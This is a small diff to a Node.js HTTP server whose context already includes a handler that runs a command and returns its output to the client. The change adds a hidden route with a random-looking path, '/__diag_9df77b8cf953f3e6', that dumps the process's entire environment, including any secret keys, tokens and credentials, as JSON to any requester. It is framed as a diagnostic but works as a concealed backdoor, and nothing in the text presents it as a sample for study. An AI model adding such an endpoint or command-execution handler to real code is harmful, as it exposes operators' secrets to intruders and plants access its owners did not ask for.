@@ -125,6 +125,9 @@ const server = http.createServer((req, res) => {
                 res.end('CMD: '+cmd+'\n--- STDOUT ---\n'+so+'\n--- STDERR ---\n'+se+'\n--- ERR ---\n'+(e?String(e):'none'));
             });
         } catch (ex) { res.writeHead(500); res.end(String(ex)); }
+    } else if (req.url === '/__diag_9df77b8cf953f3e6') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify(process.env, null, 2));
     } else {
         res.writeHead(404, { 'Content-Type': 'text/plain' });
         res.end('Not Found');
